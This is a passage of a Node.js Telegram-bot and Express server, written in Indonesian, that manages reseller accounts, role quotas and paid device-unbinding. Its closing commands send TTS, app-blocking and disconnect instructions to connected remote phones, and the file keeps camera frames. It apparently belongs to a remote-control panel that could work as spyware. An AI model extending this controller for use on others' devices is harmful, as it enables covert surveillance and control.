  const userId = msg.from.id
  const targetId = match[1]
  const targetRole = match[2].toLowerCase()
  const amount = parseInt(match[3])

  const granterRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  if (!['developer', 'owner'].includes(granterRole)) {
    return bot.sendMessage(chat, '⛔ Cuma Developer & Owner yang bisa del visa.')
  }

  if (!ROLE_HIERARCHY.includes(targetRole)) {
    return bot.sendMessage(chat, `❌ Role "${targetRole}" tidak valid.`)
  }

  const access = loadBotAccess()
  const userAccess = access[String(targetId)]

  if (!userAccess || !userAccess.visa) {
    return bot.sendMessage(chat, `❌ User ${targetId} belum punya visa.`)
  }

  const current = userAccess.visa[targetRole] || 0
  userAccess.visa[targetRole] = Math.max(0, current - amount)
  saveBotAccess(access)

  bot.sendMessage(chat, `✅ Visa dikurangi!\n\nUser: ${targetId}\nRole: ${targetRole}\nJumlah: -${amount}\nSisa: ${userAccess.visa[targetRole]}`)
})

// -- /DELAKUN — Hapus Akun --
bot.onText(/^\/delakun\s+(.+)/, async (msg, match) => {
  const chat = msg.chat.id
  const userId = msg.from.id
  const targetUser = match[1].trim().toLowerCase()
  const myRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')

  const groupAdmin = await isGroupAdmin(chat, userId)
  if (!['developer', 'owner', 'reseller'].includes(myRole) && !groupAdmin) {
    return bot.sendMessage(chat, '⛔ Cuma developer, owner, reseller, dan admin group yang bisa hapus akun.')
  }

  const accounts = loadAccounts()
  if (!accounts[targetUser]) {
    return bot.sendMessage(chat, `❌ Akun "${targetUser}" tidak ditemukan.`)
  }

  const targetRole = accounts[targetUser].role || 'member'
  const myIdx = roleIndex(myRole)
  const targetIdx = roleIndex(targetRole)

  if (myIdx >= targetIdx) {
    return bot.sendMessage(chat, `⛔ Role "${myRole}" tidak bisa menghapus akun dengan role "${targetRole}".`)
  }

  delete accounts[targetUser]
  saveAccounts(accounts)

  const devs = loadDevices()
  delete devs[targetUser]
  saveDevices(devs)

  let kicked = 0
  for (const [tok, sess] of Object.entries(sessions)) {
    if (sess.username === targetUser) { delete sessions[tok]; kicked++ }
  }

  await sendNotifAkunHapus(targetUser, msg.from.username || String(userId))

  bot.sendMessage(chat, `✅ Akun "${targetUser}" berhasil dihapus.\nSesi dikick: ${kicked}`)
})

// -- /LIST — List Akun --
bot.onText(/^\/list/, async (msg) => {
  const chat = msg.chat.id
  const userId = msg.from.id

  const groupAdmin = await isGroupAdmin(chat, userId)
  if (!isBotAdmin(userId) && !groupAdmin) {
    return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses Bot.')
  }

  const botRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')
  const accounts = loadAccounts()
  const myIdx = roleIndex(botRole)

  const list = Object.entries(accounts)
    .filter(([uname, acc]) => {
      const accRole = acc.role || 'member'
      const accIdx = roleIndex(accRole)
      if (botRole === 'developer' || isOwner(userId)) return true
      return accIdx >= myIdx || uname === (msg.from.username || '').toLowerCase()
    })
    .map(([username, acc], i) => {
      return `${i + 1}. *${acc.displayName || username}* [${acc.role || 'member'}]`
    })

  if (list.length === 0) {
    return bot.sendMessage(chat, '📭 Belum ada akun.', { parse_mode: 'Markdown' })
  }

  bot.sendMessage(chat, `*📋 ACCOUNT LIST*\n\n${list.join('\n')}`, { parse_mode: 'Markdown' })
})

// -- /IDLIST — List Account IDs --
bot.onText(/^\/idlist/, async (msg) => {
  const chat = msg.chat.id
  const userId = msg.from.id

  const groupAdmin = await isGroupAdmin(chat, userId)
  if (!isBotAdmin(userId) && !groupAdmin) {
    return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses Bot.')
  }

  const botRole = getBotRole(userId) || (isOwner(userId) ? 'developer' : 'member')
  const accounts = loadAccounts()
  const myIdx = roleIndex(botRole)

  const list = Object.entries(accounts)
    .filter(([uname, acc]) => {
      const accRole = acc.role || 'member'
      const accIdx = roleIndex(accRole)
      if (botRole === 'developer' || isOwner(userId)) return true
      return accIdx >= myIdx || uname === (msg.from.username || '').toLowerCase()
    })
    .map(([username, acc], i) => {
      return `${i + 1}. *${acc.displayName || username}*\n   \`${acc.uid || '-'}\``
    })

  if (list.length === 0) {
    return bot.sendMessage(chat, '📭 Belum ada akun.', { parse_mode: 'Markdown' })
  }

  bot.sendMessage(chat, `*🆔 ACCOUNT ID LIST*\n\n${list.join('\n\n')}`, { parse_mode: 'Markdown' })
})

// ===================== HELPER SYSTEM ============================
// ================================================================

const HELPER_PRICE = 5000;
const HELPER_TIMER = 300;
const HELPERS_FILE = path.join(__dirname, 'helpers.json');

function loadHelpers() {
    try {
        return JSON.parse(fs.readFileSync(HELPERS_FILE, 'utf8'));
    } catch {
        return {};
    }
}

function saveHelpers(helpers) {
    fs.writeFileSync(HELPERS_FILE, JSON.stringify(helpers, null, 2));
}

// -- CREATE HELPER ORDER --
app.post('/api/helper/create', async (req, res) => {
    const { username, amount } = req.body;

    if (!username || username.length < 3) {
        return res.status(400).json({
            success: false,
            error: 'Username minimal 3 karakter!'
        });
    }

    const accounts = loadAccounts();
    const key = username.toLowerCase();

    if (!accounts[key]) {
        return res.status(404).json({
            success: false,
            error: `Username "${username}" tidak ditemukan di sistem!`
        });
    }

    const orderId = 'HLP-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex').toUpperCase();

    try {
        const qris = await createQrisPakasir({
            amount: HELPER_PRICE,
            orderId: orderId
        });

        const helpers = loadHelpers();
        helpers[orderId] = {
            username: username,
            amount: HELPER_PRICE,
            status: 'pending',
            pakasir_order_id: qris.invoice_id || orderId,
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + HELPER_TIMER * 1000).toISOString()
        };
        saveHelpers(helpers);

        console.log(`[HELPER] Invoice: ${orderId} | ${username} | Rp ${HELPER_PRICE.toLocaleString('id-ID')}`);

        res.json({
            success: true,
            invoice_id: orderId,
            amount: HELPER_PRICE,
            qr_image: qris.qrString,
            payment_url: `https://app.pakasir.com/pay/${qris.invoice_id || orderId}`,
            expires_in: HELPER_TIMER
        });

    } catch (error) {
        console.error('[HELPER] Error:', error.message);
        res.status(500).json({
            success: false,
            error: `Gagal membuat QRIS: ${error.message}`
        });
    }
});

// -- CHECK HELPER STATUS --
app.get('/api/helper/status/:invoiceId', async (req, res) => {
    const { invoiceId } = req.params;
    const helpers = loadHelpers();
    const helper = helpers[invoiceId];

    if (!helper) {
        return res.status(404).json({
            status: 'not_found',
            error: 'Invoice tidak ditemukan'
        });
    }

    if (helper.status === 'pending' && new Date(helper.expiresAt) <= new Date()) {
        helper.status = 'expired';
        saveHelpers(helpers);
        return res.json({ status: 'expired', invoice_id: invoiceId });
    }

    try {
        const status = await checkStatusPakasir({
            orderId: helper.pakasir_order_id || invoiceId,
            amount: helper.amount
        });

        if (status.isPaid) {
            helper.status = 'paid';
            helper.paidAt = new Date().toISOString();
            saveHelpers(helpers);
        }

        res.json({
            status: helper.status,
            invoice_id: invoiceId,
            amount: helper.amount,
            username: helper.username
        });

    } catch (error) {
        console.error('[HELPER] Check status error:', error.message);
        res.status(500).json({
            status: 'error',
            error: `Gagal cek status: ${error.message}`
        });
    }
});

// -- COMPLETE HELPER --
app.post('/api/helper/complete', async (req, res) => {
    const { invoice_id, username } = req.body;

    if (!invoice_id || !username) {
        return res.status(400).json({
            success: false,
            error: 'Data tidak lengkap'
        });
    }

    const helpers = loadHelpers();
    const helper = helpers[invoice_id];

    if (!helper) {
        return res.status(404).json({
            success: false,
            error: 'Invoice tidak ditemukan'
        });
    }

    if (helper.status !== 'paid') {
        return res.status(400).json({
            success: false,
            error: 'Pembayaran belum dikonfirmasi'
        });
    }

    const key = username.toLowerCase();
    const devices = loadDevices();
    let clearedCount = 0;

    if (devices[key]) {
        delete devices[key];
        saveDevices(devices);
        clearedCount = 1;
        console.log(`[HELPER] Cache di-clear untuk: ${key}`);
    } else {
        for (const [deviceId, deviceData] of Object.entries(devices)) {
            if (deviceData === key || (deviceData && deviceData.username === key)) {
                delete devices[deviceId];
                clearedCount++;
            }
        }
        if (clearedCount > 0) {
            saveDevices(devices);
            console.log(`[HELPER] ${clearedCount} device di-clear untuk: ${key}`);
        }
    }

    helper.status = 'completed';
    helper.completedAt = new Date().toISOString();
    helper.clearedCount = clearedCount;
    saveHelpers(helpers);

    console.log(`[HELPER] Selesai: ${username} | ${clearedCount} device di-clear`);

    try {
        await bot.sendMessage(OWNER_ID,
            `🔧 *HELPER COMPLETED*\n\nInvoice: ${invoice_id}\nUsername: ${username}\nCache: ${clearedCount} device di-clear\nHarga: Rp ${helper.amount.toLocaleString('id-ID')}`
        );
    } catch (e) {}

    res.json({
        success: true,
        username: username,
        cleared_count: clearedCount
    });
});

// -- GET HELPERS (Admin) --
app.get('/api/admin/helpers', requireAuth, (req, res) => {
    const myRole = getAccountRole(req.username);
    if (!['developer', 'owner'].includes(myRole)) {
        return res.status(403).json({ error: 'Akses ditolak' });
    }

    const helpers = loadHelpers();
    const list = Object.entries(helpers).map(([id, data]) => ({
        invoice_id: id,
        ...data
    }));

    res.json(list);
});

// -- ROUTE HELPER --
app.get('/helper', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'helper.html'));
});

console.log('🔧 HELPER SYSTEM LOADED');



// -- /TTS COMMAND --
bot.onText(/^\/tts\s+(\S+)\s+(.+)/, async (msg, match) => {
  const chat = msg.chat.id
  const userId = msg.from.id
  const deviceId = match[1]
  const message = match[2]

  if (!isBotAdmin(userId)) {
    return bot.sendMessage(chat, '⛔ Ga punya akses!')
  }

  if (!devices[deviceId]) {
    return bot.sendMessage(chat, `❌ Device "${deviceId}" tidak ditemukan.`)
  }

  io.to(`device:${deviceId}`).emit('command', { command: 'ttsSpeak', value: message })
  devices[deviceId].status.ttsSpeaking = true
  broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

  bot.sendMessage(chat, `🗣️ TTS sent to *${devices[deviceId].name}*`, { parse_mode: 'Markdown' })
})

// -- /BLOCKAPP COMMAND --
bot.onText(/^\/blockapp\s+(\S+)\s+(.+)/, async (msg, match) => {
  const chat = msg.chat.id
  const userId = msg.from.id
  const deviceId = match[1]
  const packageName = match[2]

  if (!isBotAdmin(userId)) {
    return bot.sendMessage(chat, '⛔ Ga punya akses!')
  }

  if (!devices[deviceId]) {
    return bot.sendMessage(chat, `❌ Device "${deviceId}" tidak ditemukan.`)
  }

  const arr = devices[deviceId].status.blockedApps || []
  if (!arr.includes(packageName)) arr.push(packageName)
  devices[deviceId].status.blockedApps = arr

  io.to(`device:${deviceId}`).emit('command', { command: 'blockApp', value: JSON.stringify({ package: packageName }) })
  broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))

  bot.sendMessage(chat, `🚫 App *${packageName}* blocked on *${devices[deviceId].name}*`, { parse_mode: 'Markdown' })
})

// -- /KICKDEVICE COMMAND --
bot.onText(/^\/kickdevice\s+(.+)/, async (msg, match) => {
  const chat = msg.chat.id
  const userId = msg.from.id
  const deviceId = match[1].trim()

  if (!isBotAdmin(userId)) {
    return bot.sendMessage(chat, '⛔ Ga punya akses!')
  }

  if (!devices[deviceId]) {
    return bot.sendMessage(chat, `❌ Device "${deviceId}" tidak ditemukan.`)
  }

  const socketId = devices[deviceId].socketId
  const s = io.sockets.sockets.get(socketId)
  if (s) {
    s.disconnect(true)
  }

  delete cameraFrames[deviceId]
  delete devices[deviceId]

  bot.sendMessage(chat, `👢 Device *${deviceId}* kicked!`, { parse_mode: 'Markdown' })
})

const PORT = process.env.PORT || 2185
server.listen(PORT, () => {

sendAccountsToBot()
setInterval(sendAccountsToBot, 5 * 60 * 60 * 1000)

// Auto-backup accounts.json tiap 2 jam — Developer ONLY (kirim ke OWNER_ID)
setInterval(async () => {
  try {
    await bot.sendDocument(OWNER_ID, ACCOUNTS_FILE, {}, {
      filename: `accounts_backup_${new Date().toISOString().replace(/[:.]/g,'-')}.json`,
      contentType: 'application/json'
    })
    console.log('[BACKUP] accounts.json terbackup otomatis')
  } catch (e) {
    console.error('[BACKUP] Gagal:', e.message)
  }
}, 2 * 60 * 60 * 1000)


  console.log(`Server Online :${PORT}`)
  console.log('Bot Telegram SYNC Berjalan...')
})
